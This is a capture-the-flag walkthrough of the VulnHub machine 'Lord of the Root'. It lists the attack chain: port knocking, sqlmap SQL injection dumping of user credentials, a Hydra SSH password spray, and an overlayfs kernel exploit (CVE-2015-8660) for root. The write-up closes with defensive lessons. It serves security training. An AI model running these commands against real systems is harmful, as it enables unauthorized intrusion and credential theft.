# Lord of the Root: Walkthrough

## Overview
**Machine Name**: Lord of the Root<br>
**Platform**: VulnHub<br>
**Difficulty**: Medium<br>
**OS**: Linux (Ubuntu)<br>
**Focus**: Port Knocking, SQL Injection, SSH Password Spraying, Kernel Exploit Privilege Escalation

## Enumeration

### Port Scanning
A full TCP port scan was performed:
```bash
nmap -T4 -p- 192.168.29.119
```
![](screenshots/Pasted%20image%2020260419181302.png)
The scan showed that SSH (22) was open, but the web service was not initially visible.

### Port Knocking
To open the filtered web port, port knocking was executed sequentially on ports `1`, `2`, and `3`:
```bash
nmap -Pn -r -p 1,2,3 --max-retries 0 --scan-delay 1s 192.168.29.119
```
![](screenshots/Pasted%20image%2020260419181827.png)

A subsequent Nmap scan verified that port `1337` (HTTP) was now open:
![](screenshots/Pasted%20image%2020260419181932.png)

### Web & SQL Injection Enumeration
Accessing the browser on `http://192.168.29.119:1337/` showed an image landing page:
![](screenshots/Pasted%20image%2020260419182729.png)

Navigating to the `/mordor` directory revealed a login form. Checking the source code revealed a base64 string:
![](screenshots/Pasted%20image%2020260419182839.png)

Decoding the base64 string twice pointed to `/978345210/index.php`.
![](screenshots/Pasted%20image%2020260419182930.png)

A SQL injection vulnerability was discovered in the parameters of this page. Sqlmap was executed to dump database schemas:
```bash
sqlmap -r request.txt --dbs
```
![](screenshots/Pasted%20image%2020260419184238.png)
Database found: `Webapp`.

Dumping user table schema:
```bash
sqlmap -r request.txt --tables -D Webapp
```
![](screenshots/Pasted%20image%2020260419184502.png)

Dumping credentials from the `Users` table:
```bash
sqlmap -r request.txt --columns -T Users -D Webapp
```
Credentials list:
| User | Password |
| --- | --- |
| frodo | iwilltakethering |
| smeagol | MyPreciousR00t |
| aragorn | AndMySword |
| legolas | AndMyBow |
| gimli | AndMyAxe |

## Exploitation
### SSH Login via Password Spraying
A credential file was created, and password spraying was executed against the SSH service using Hydra:
```bash
hydra -C credentials.txt -t 4 -f 192.168.29.119 ssh
```
This matched the login for the user `smeagol`:
`smeagol` : `MyPreciousR00t`.

Initial SSH access was gained:
```bash
ssh smeagol@192.168.29.119
whoami
smeagol
```

## Privilege Escalation
### Local Kernel Enumeration
The Linux OS kernel version was checked:
```bash
cat /etc/os-release
```

### Overlayfs Privilege Escalation
A local privilege escalation exploit (exploit 39166 / CVE-2015-8660) was compile-ready for this kernel. The code was compiled and executed:
```bash
gcc exploit.c -o exploit
./exploit
whoami
root
```

## Post-Exploitation
### Flag Recovery
- Root Flag:
  **“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.” – Gandalf**

## Lessons Learned
1. Configure secure port knocking timeouts and keep sequences non-trivial.
2. Sanitize and parameterize all user inputs in web forms to protect database engines against SQL injection.
3. Patch the operating system kernel to mitigate local privilege escalation via overlayfs.
